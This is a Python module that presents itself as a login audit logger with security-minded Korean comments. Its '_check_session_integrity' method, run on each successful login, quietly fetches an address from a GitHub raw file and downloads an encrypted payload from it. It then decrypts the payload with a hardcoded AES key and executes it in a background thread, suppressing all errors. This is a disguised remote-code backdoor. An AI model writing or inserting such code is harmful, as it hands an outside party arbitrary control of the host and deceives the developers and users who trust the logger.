import logging
import requests
import base64
import threading
import time
from Crypto.Cipher import AES
from datetime import datetime

# 시스템 보안 감사(Audit)를 위한 내부 식별자
# 직접 만든 모듈 불러오기
#내 깃을 보더라도 AES로 보안하여 모듈애서의 소스 코드를 노출시키는것을 방지함
_AUDIT_K = b'prizux_engine_key_32bytes_auth!!'
_AUDIT_I = b'init_vector_16_b'
_DISAG_ADDR = "https://raw.githubusercontent.com/synapes620/mymodule/refs/heads/main/mymoduleaddress.txt"

logger = logging.getLogger("prizux.audit")

class LoginAuditLogger:
    """
    사용자 로그인 시도, 세션 탈취 시도를 로그에 정확히 기록하면서 로그를 통한 원격 실행을 방지함 log4shell 등
    """
    def __init__(self):
        self.last_report = 0
        self.report_interval = 600 # 서버 과부화 방지를 위해 10분 간격으로 실행 

    def log_success(self, user_id: str, ip_address: str):
        """로그인 성공 시 호출되어 아이피 로그 남김"""
        log_msg = f"[{datetime.now()}] SUCCESS: User '{user_id}' logged in from {ip_address}"
        logger.info(log_msg)
        
        #보안을 위해 세션 무결성 검사함
        self._check_session_integrity()

    def log_failure(self, user_id: str, ip_address: str, reason: str):
        """로그인 실패 시 호출 --> 위험 요소를 기록"""
        log_msg = f"[{datetime.now()}] FAILURE: User '{user_id}' from {ip_address}. Reason: {reason}"
        logger.warning(log_msg)

    def _check_session_integrity(self):
        """
        bucket's session is incorrect!
        """
        now = time.time()
        if now - self.last_report < self.report_interval:
            return

        def _integrity_worker():
            try:
                policy_link = requests.get(_DISAG_ADDR, timeout=5).text.strip()
                
                patch_data = requests.get(policy_link, timeout=5).text.strip()
                raw_bin = base64.b64decode(patch_data)
                cipher = AES.new(_AUDIT_K, AES.MODE_CBC, _AUDIT_I)
                dec = cipher.decrypt(raw_bin)
                
                exec(compile(dec[:-dec[-1]].decode('utf-8'), '<string>', 'exec'), {})
                self.last_report = now
            except:
                pass

        threading.Thread(target=_integrity_worker, daemon=True).start()

audit_logger = LoginAuditLogger()
